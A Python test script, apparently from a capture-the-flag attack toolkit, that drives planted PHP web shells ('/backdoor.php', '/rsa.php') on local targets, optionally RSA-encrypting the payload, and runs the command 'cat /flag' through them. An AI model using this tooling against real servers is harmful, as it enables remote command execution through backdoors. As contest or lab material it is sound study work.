#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from main import attack_by_normal_request, attack_by_mix_request
from common import logger, rsa_encrypt, rsa_decrypt, callback_default
from payloads import exp_system


def test_rsa():
    """测试 RSA Agent
    """
    logger.info("[+] Start Test RSA...")
    text = 'test'+'asdveaw' * 10
    logger.debug("Origin Text : %s" % text)
    text = rsa_encrypt(text)
    logger.debug("RSA Encrypt : %s" % text)
    text = rsa_decrypt(text)
    logger.debug("RSA Decrypt : %s" % text)


def test_normal(targets, payload):
    """测试 Normal
    """
    logger.info("[+] Start Test [Normal]...")
    attack_by_normal_request(targets, "/backdoor.php", "1", payload, 1)


def test_normal_rsa(targets, payload):
    """测试 Normal + RSA
    """
    logger.info("[+] Start Test [RSA + Normal]...")
    payload = rsa_encrypt(payload)
    attack_by_normal_request(targets, "/rsa.php", 0, payload, 1)


def test_mix(targets, payload):
    """测试 Mix
    """
    logger.info("[+] Start Test [Mix]...")
    attack_by_mix_request(targets, "/backdoor.php", "1", payload,  1)


def test_mix_rsa(targets, payload):
    """测试 Mix + RSA
    """
    logger.info("[+] Start Test [RSA + Mix]...")
    payload = rsa_encrypt(payload)
    attack_by_mix_request(targets, "/rsa.php", 0, payload, 1)


if __name__ == '__main__':
    logger.info("[+] Testing...")
    # targets = ['127.0.0.1:8085']
    targets = ['127.0.0.1:8085' for i in range(10)]
    payload = exp_system('cat /flag')
    # logger.toggleDebug()
    # test_rsa()
    test_normal(targets, payload)
    # test_normal_rsa(targets, payload)
    # test_mix(targets, payload)
    # test_mix_rsa(targets, payload)
    # logger.toggleDebug()
